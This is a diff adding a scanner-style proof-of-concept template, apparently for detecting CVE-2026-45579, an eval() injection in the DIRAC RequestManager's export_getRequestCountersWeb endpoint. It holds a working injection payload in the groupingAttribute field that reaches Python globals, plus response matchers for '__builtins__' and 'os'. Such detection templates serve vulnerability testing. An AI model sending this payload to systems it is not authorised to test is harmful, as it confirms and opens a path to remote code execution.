@@ -1,0 +1,38 @@
+[info]
+author = "AVE"
+description = "检测DIRAC RequestManager中export_getRequestCountersWeb接口的eval()注入漏洞，通过构造恶意groupingAttribute参数触发Python代码执行"
+id = "POC-AVE-2026-0285"
+name = "CVE-2026-45579 PoC"
+severity = "critical"
+tags = ["cve-2026-45579"]
+vuln_id = [
+    "CVE-2026-45579",
+    "AVE-2026-0285",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/DIRAC/RequestManagementSystem/ReqManagerHandler/export_getRequestCountersWeb"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"groupingAttribute": "__class__.__init__.__globals__"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "__builtins__",
+    "__import__",
+    "os",
+    "system",
+]
